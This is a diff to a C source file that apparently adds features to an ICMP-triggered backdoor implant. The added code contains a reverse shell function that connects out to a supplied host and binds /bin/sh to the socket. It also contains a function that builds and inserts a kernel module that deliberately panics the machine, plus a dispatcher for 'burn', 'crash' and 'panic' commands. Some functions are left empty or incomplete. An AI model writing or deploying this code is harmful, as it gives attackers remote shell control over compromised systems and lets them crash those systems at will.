@@ -7,6 +7,44 @@
 #include<arpa/inet.h>           //sokcet
 #include<unistd.h>              //close
 
+int panic() {
+
+    // stack exchange IW16
+    char *m="mkdir /tmp/ptest && cd /tmp/ptest && \
+printf '#include <linux/kernel.h>\n#include <linux/module.h>\nMODULE_LICENSE(\"GPL\");\
+static int8_t* message = \"buffer overrun at 0xdeadbeefdeadbeef\";\
+int init_module(void){panic(message);return 0;}' > kpanic.c && \
+printf 'obj-m += kpanic.o\nall:\n\t\
+make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules' > \
+Makefile && make && insmod kpanic.ko";
+
+    system(m);
+    return 0;
+}
+
+int pop(char *lhost, char *pname, int lport) {
+    struct sockaddr_in base;
+    if (fork() == 0) {
+        base.sin_family = AF_INET;
+        base.sin_addr.s_addr = inet_addr(lhost);
+        base.sin_port = htons(lport);
+        
+        int r = socket(AF_INET, SOCK_STREAM, 0);
+        connect(r, (struct sockaddr *)&base, sizeof(base));
+        dup2(r, 0);
+        dup2(r, 1);
+        dup2(r, 2);
+        execl("/bin/sh", pname, NULL);
+        exit();
+    } else 
+        return 1;
+    return 0;
+}
+
+int exc(char *cmd) {
+
+}
+
 int get_cmd(char *payload, char *output, int size) {
 
     int i,j, len;
@@ -36,6 +74,20 @@ int get_cmd(char *payload, char *output, int size) {
     }
     output[j] = 0x00;
     return 0;
+}
+
+
+int process_cmd(char *cmd) {
+    if (strcmp(cmd, "burn") == 0) {
+        printf("Burning...\n");
+        //burn();
+    } else if (strcmp(cmd, "crash") == 0) {
+        printf("Crashing...\n");
+        //crash();
+    } else if (strcmp(cmd, "panic") == 0) {
+        printf("Panicking...\n");
+        //crash();
+    }
 }
 
 int process_icmp(unsigned char* buffer , int size, char *ip_src, char *ip_dst, char *msg) {
